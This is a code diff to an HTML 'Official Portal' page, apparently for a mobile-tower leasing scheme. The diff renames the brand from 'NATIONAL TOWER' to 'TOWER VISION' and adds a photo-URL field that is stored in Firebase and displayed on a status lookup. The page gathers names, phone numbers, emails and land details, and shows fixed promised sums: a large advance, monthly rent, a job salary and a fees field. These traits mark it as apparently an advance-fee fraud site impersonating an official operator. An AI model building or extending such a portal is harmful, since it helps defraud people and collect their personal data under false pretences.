@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NATIONAL TOWER | Official Portal</title>
+    <title>TOWER VISION | Official Portal</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -82,7 +82,21 @@
 
         /* Status Result Box (IMAGE IN BOX) */
         #status-display-box { display: none; margin-top: 25px; border-top: 3px solid var(--gold); padding-top: 20px; }
-        .client-photo { width: 150px; height: 150px; border-radius: 12px; background: #eee; margin: 0 auto 20px; border: 4px solid var(--blue); display: flex; align-items: center; justify-content: center; font-size: 45px; } /* Updated border-radius for box */
+        .client-photo{
+            width:120px;
+            height:140px;
+            margin:0 auto 20px;
+            border-radius:10px;
+            overflow:hidden;
+            border:3px solid var(--blue);
+            background:#eee;
+        }
+
+        .client-photo img{
+            width:100%;
+            height:100%;
+            object-fit:cover;
+        }
         .status-info { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #eee; font-size: 18px; }
         .status-info b { color: var(--blue); }
         .badge { background: var(--gold); color: black; padding: 5px 15px; border-radius: 20px; font-weight: bold; }
@@ -170,6 +184,7 @@
             <input type="number" id="uMobile" placeholder="Mobile Nomber">
             <input type="email" id="uEmail" placeholder="Email Address">
             <input type="text" id="uCity" placeholder="City / State">
+            <input type="text" id="uPhoto" placeholder="Photo URL Paste Karein">
             <textarea id="uMsg" rows="3" placeholder="Zameen ki Detail (Write Your Message here)"></textarea>
             <button class="btn btn-apply" onclick="submitToFirebase()">SUBMIT APPLICATION</button>
         </div>
@@ -180,7 +195,9 @@
             <button class="btn btn-status" onclick="getStatusFromFirebase()">GET STATUS DETAILS</button>
 
             <div id="status-display-box">
-                <div class="client-photo">👤</div> <div class="status-info"><span>Name:</span> <b id="sName">-</b></div>
+                <div class="client-photo">
+                    <img id="clientImg" src="https://via.placeholder.com/120x140">
+                </div> <div class="status-info"><span>Name:</span> <b id="sName">-</b></div>
                 <div class="status-info"><span>Mobile:</span> <b id="sMob">-</b></div>
                 <div class="status-info"><span>City:</span> <b id="sCity">-</b></div>
                 <div class="status-info"><span>Advance Amount:</span> <b id="sAdv">₹ 30,00,000</b></div>
@@ -264,6 +281,7 @@
             const mobile = document.getElementById('uMobile').value;
             const email = document.getElementById('uEmail').value;
             const city = document.getElementById('uCity').value;
+            const photoUrl = document.getElementById('uPhoto').value;
             const msg = document.getElementById('uMsg').value;
 
             if(!name || !mobile) { 
@@ -277,6 +295,7 @@
                 email: email,
                 city: city,
                 message: msg,
+                photoUrl: photoUrl,
                 advance: "60,00,000",
                 rent: "45,000",
                 job: "24,000",
@@ -310,6 +329,8 @@
                     document.getElementById('sJob').innerText = "₹ " + (data.job || "24,000");
                     document.getElementById('sFees').innerText = "₹ " + (data.fees || "0");
                     document.getElementById('sStatus').innerText = data.status || "Pending";
+                    document.getElementById('clientImg').src =
+                    data.photoUrl || 'https://via.placeholder.com/120x140';
                     
                     // Scroll down to show result
                     document.getElementById('status-display-box').scrollIntoView({behavior: "smooth"});
@@ -321,3 +342,7 @@
     </script>
 </body>
 </html>
+    
+                
+            
+                    
